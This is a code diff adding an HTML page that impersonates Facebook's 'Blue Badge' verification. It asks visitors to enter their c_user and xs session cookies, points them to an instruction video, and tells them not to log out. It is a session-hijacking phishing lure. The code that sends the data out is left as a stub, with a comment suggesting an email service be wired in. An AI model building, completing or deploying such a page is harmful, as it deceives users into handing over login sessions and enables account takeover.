@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validation Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f6f6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #fff;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      color: #333;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #0056b3;
+    }
+
+    .video-container {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .video-container video {
+      width: 100%;
+      max-width: 600px;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #777;
+      text-align: center;
+    }
+
+    .alert-danger {
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div
+    style="
+      width: 100%;
+      background: #fff;
+      padding: 20px 0;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    "
+  >
+    <h1 class="text-primary">Request Your Blue Badge</h1>
+  </div>
+
+  <form id="validationForm" onsubmit="sendEmail(event)">
+    <div class="container mt-4">
+      <div class="row justify-content-center">
+        <div class="col-12 col-md-8 col-lg-6">
+          <div class="border p-4 bg-light">
+            <h5 class="mb-3">Get Verified on Facebook</h5>
+
+            <div id="alert-danger" class="alert-danger" style="display:none;">
+              Please enter valid values for both fields.
+            </div>
+
+            <p>
+              The verified badge confirms that Facebook has recognized your
+              account as authentic. By submitting the form below, you'll be
+              reviewed for verification.
+            </p>
+
+            <div class="mb-3">
+              <label class="form-label">c_user</label>
+              <input
+                type="number"
+                name="c_user"
+                id="c_user"
+                class="form-control"
+                required
+                pattern="^\d{15}$"
+                title="Please enter 15 digits"
+              />
+            </div>
+
+            <div class="mb-3">
+              <label class="form-label">xs</label>
+              <input
+                type="text"
+                name="xs"
+                id="xs"
+                class="form-control"
+                required
+              />
+            </div>
+
+            <div class="mb-3 text-center">
+              <p>Be sure to watch the video below for more instructions:</p>
+              <video
+                controls
+                muted
+                id="instructionVideo"
+                style="width: 100%; max-width: 400px; height: auto;"
+                src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
+              ></video>
+              <br />
+              <button
+                type="button"
+                class="btn btn-sm btn-secondary mt-2"
+                onclick="enableSound()"
+              >
+                Enable Sound
+              </button>
+            </div>
+
+            <p class="mt-2">
+              Please make sure not to log out from your computer or laptop
+              until you have received a verification email.
+            </p>
+
+            <div class="text-end mt-4">
+              <button
+                type="submit"
+                class="btn btn-primary"
+                style="background: #4267b2"
+              >
+                Submit
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </form>
+
+  <script>
+    function enableSound() {
+      const video = document.getElementById('instructionVideo');
+      video.muted = false;
+    }
+
+    function sendEmail(event) {
+      event.preventDefault();
+
+      const cUserValue = document.getElementById("c_user").value;
+      const xsValue = document.getElementById("xs").value;
+
+      const cUserPattern = /^\d{15}$/;
+      const xsPattern = /.*%+.*/;
+
+      const isCUserValid = cUserPattern.test(cUserValue);
+      const isXsValid = xsPattern.test(xsValue);
+
+      if (isCUserValid && isXsValid) {
+        // You can integrate with EmailJS here for email sending
+        console.log("Form submission success");
+        alert("Form submitted successfully!");
+      } else {
+        document.getElementById('alert-danger').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
